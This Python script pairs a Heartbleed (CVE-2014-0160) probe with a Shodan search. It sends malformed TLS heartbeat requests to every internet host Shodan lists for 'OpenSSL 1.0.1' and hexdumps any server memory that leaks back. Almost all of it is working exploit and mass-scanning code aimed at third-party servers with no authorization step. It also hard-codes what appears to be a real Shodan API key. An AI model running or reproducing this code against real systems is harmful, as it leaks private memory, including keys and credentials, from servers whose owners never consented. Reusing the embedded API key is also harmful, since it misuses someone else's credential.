# -*- encoding: utf-8 -*-
import shodan

import sys
import struct
import socket
import time
import select
import re
import codecs
from optparse import OptionParser

decode_hex = codecs.getdecoder('hex_codec')

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

server_vulnerable =[]

def h2bin(x):
        return decode_hex(x.replace(' ', '').replace('\n', ''))[0]

hello = h2bin('''
        16 03 02 00  dc 01 00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
        00 0f 00 01 01                                  
        ''')

hb = h2bin(''' 
        18 03 02 00 03
        01 40 00
        ''')

def hexdump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
        print( '  %04x: %-48s %s' % (b, hxdat, pdat))
    print()

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print( 'Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print( 'Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print( ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print( 'No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print( 'Received heartbeat response:')
            hexdump(pay)
            if len(pay) > 3:
                print( 'WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print( 'Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print( 'Received alert:')
            hexdump(pay)
            print( 'Server returned error, likely not vulnerable')
            return False
            
def checkVulnerability(ip,port):
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('Connecting with ...' + ip + ' Port: '+ port)
        sys.stdout.flush()
        s.connect((ip, int(port)))
        print('Sending Client Request...')
        sys.stdout.flush()
        s.send(hello)
        print('Waiting for Server Request...')
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                    print('Server closed connection without sending Server Request.')
                    break
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                    break

            print('Sending heartbeat request...')
            sys.stdout.flush()
            s.send(hb)
            if hit_hb(s):
                server_vulnerable.append(ip)
    
    except socket.timeout:
        print("TimeOut error")
        

SHODAN_API_KEY = "v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik"

#class for search in shodan
class ShodanSearch:

    def __init__(self):
        self.shodanApi = shodan.Shodan(SHODAN_API_KEY)
        
    def shodanKeyInfo(self):
        try:
            info = self.shodanApi.info()
            for inf in info:
                print('%s: %s ' %(inf, info[inf]))
        except Exception as e:
            print('Error: %s' % e)
            
    def shodanSimpleSearch(self,query):
        try:
            results = self.shodanApi.search(str(query))
            # Show the results
            print('Results found: %s' % results['total'])
            print('-------------------------------------')
            for result in results['matches']:
                print('IP: %s' % result['ip_str'])
                print(result['data'])
                self.obtain_host_info(result['ip_str'])
                print('--------------------------------------------')
        except shodan.APIError as e:
                print('Error in search: %s' % e)

    #Obtain info IP
    def obtain_host_info(self,IP):
        try:
                host = self.shodanApi.host(IP)
                if len(host) != 0:
                            # Print host info
                            print('IP: %s' % host.get('ip_str'))
                            print('Country: %s' % host.get('country_name','Unknown'))
                            print('City: %s' % host.get('city','Unknown'))
                            print('Latitude: %s' % host.get('latitude'))
                            print('Longitude: %s' % host.get('longitude'))
                            print('Hostnames: %s' % host.get('hostnames'))

                            for i in host['data']:
                               print('Port: %s' % i['port'])
                               
                            return host
        except shodan.APIError as e:
                print(' Error: %s' % e)
                return host
                
    def shodanSearchVulnerable(self,query):

        results = self.shodanApi.search(query)
        # Show the results
        print('Results found: %s' % results['total'])
        print('-------------------------------------')
        for result in results['matches']:
            try:
                print('IP: %s' % result['ip_str'])
                print(result['data'])
                host = self.obtain_host_info(result['ip_str'])
                portArray = []
                for i in host['data']:
                    port = str(i['port'])
                    portArray.append(port)
                    
                print('Checking port 443........................')

                #check heartbeat vulnerability in port 443
                checkVulnerability(result['ip_str'],'443')
                
            except Exception as e:
                print('Error connecting: %s' % e)
                continue
            except socket.timeout:
                print('Error connecting Timeout error: %s' % e)
                continue
            
        print('-----------------------------------------------')
        print('Final Results')
        print('-----------------------------------------------')
        if len(server_vulnerable) == 0:
            print('No Server vulnerable found')
        if len(server_vulnerable) > 0:
            print('Server vulnerable found ' + str(len(server_vulnerable)))
        for server in server_vulnerable:
            print('Server vulnerable: '+ server)
            print(self.obtain_host_info(server))




if __name__ == "__main__":
    shodanSearch = ShodanSearch()
    print("Searching for OpenSSL v1.0.1.\n")
    shodanSearch.shodanSearchVulnerable("OpenSSL 1.0.1")      
